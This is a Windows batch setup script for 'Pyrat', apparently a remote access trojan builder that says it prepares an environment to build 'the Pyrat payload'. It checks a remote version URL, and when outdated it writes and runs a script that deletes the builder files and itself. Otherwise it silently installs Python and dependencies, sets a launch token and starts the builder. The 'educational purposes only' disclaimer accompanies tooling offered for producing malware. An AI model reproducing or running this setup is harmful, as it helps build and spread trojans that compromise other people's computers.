@echo off
title PotatoKing Pyrat Builder - Setup
setlocal EnableDelayedExpansion

set "CURRENT_VERSION=v1.1.2"
set "UPDATE_URL=https://pyrat.site/version"
set "WEBSITE_URL=https://pyrat.site"

cls
color 0B
echo                             __
echo ______ ___.__.____________ _/  ^|_
echo \____ ^<   ^|  ^|\_  __ \__  \\   __\
echo ^|  ^|_^> ^>___  ^| ^|  ^| \// __ \^|  ^|
echo ^|   __// ____^| ^|__^|  (____  /__^|
echo ^|__^|   \/                 \/
echo.
echo                  Pyrat - Setup ^(%CURRENT_VERSION%^)
echo.
echo =================================================================
echo.
echo [*] Checking for new updates...
echo.

powershell -NoProfile -Command "try { $r = (Invoke-WebRequest -Uri '%UPDATE_URL%' -UseBasicParsing -TimeoutSec 5).Content.Trim(); if ($r -match '^v[0-9]+\.[0-9]+\.[0-9]+$') { $r } else { 'INVALID_RESPONSE' } } catch { 'ERROR' }" > latest_version.txt

set /p LATEST_VERSION=<latest_version.txt
del latest_version.txt

if "!LATEST_VERSION!"=="ERROR" (
    echo [!] Could not check for updates. Server might be down.
    set LATEST_VERSION=%CURRENT_VERSION%
) else if "!LATEST_VERSION!"=="INVALID_RESPONSE" (
    echo [!] Received invalid response from server. Assuming up-to-date.
    set LATEST_VERSION=%CURRENT_VERSION%
)

echo [+] Current Version: %CURRENT_VERSION%
echo [+] Latest Version:  !LATEST_VERSION!
echo.

if "!LATEST_VERSION!" neq "%CURRENT_VERSION%" (
    echo [!] YOUR VERSION IS OUTDATED!
    echo [*] A new version ^(!LATEST_VERSION!^) is available.
    echo[*] Please re-download the files from the official website:
    echo [*] %WEBSITE_URL%
    echo.
    echo [*] This script will now clean up the outdated files.
    echo =================================================================
    pause

    echo [*] Cleaning up old files...
    (
        echo @echo off
        echo title Cleaning up...
        echo timeout /t 2 /nobreak ^>nul
        echo del "builder.py" 2^>nul
        echo del "pyrat.py" 2^>nul
        echo del "requirements.txt" 2^>nul
        echo echo [+] Cleanup complete.
        echo timeout /t 2 /nobreak ^>nul
        echo del "%~nx0" 2^>nul
        echo del "cleanup_temp.cmd" 2^>nul ^& exit
    ) > cleanup_temp.cmd
    start "" /b cmd /c cleanup_temp.cmd
    exit
)

echo [+] Your version is up to date.
echo.
echo =================================================================
echo.
echo  This script will now prepare your environment to build the Pyrat
echo  payload.
echo.
echo  DISCLAIMER: This software is for educational purposes only.
echo  The developer is not responsible for any misuse.
echo.
echo =================================================================
pause
cls

echo [*] Checking for Python installation...
where python >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found in PATH.
    echo [*] Downloading Python 3.11...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe' -OutFile 'python_installer.exe'"
    echo [*] Installing Python... Please accept any UAC prompts.
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
    echo [+] Python installed successfully.
    echo [*] Note: If Python commands fail below, please close and re-run this script to refresh the system PATH.
) else (
    echo [+] Python is already installed.
)

echo.
echo ==========================================================
echo.

echo [*] Installing required libraries...
python -m pip install --upgrade pip >nul
python -m pip install -r requirements.txt
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to install libraries. Please check your internet connection and try again.
    pause
    exit /b
)
echo [+] All libraries installed successfully.

echo.
echo ==========================================================
echo.
echo [*] Launching Pyrat Builder GUI...

set PYRAT_BUILDER_LAUNCH_TOKEN=authorised
python builder.py

set PYRAT_BUILDER_LAUNCH_TOKEN=

echo.
echo [*] Builder closed. You can find the built executable in the 'dist' folder.
pause
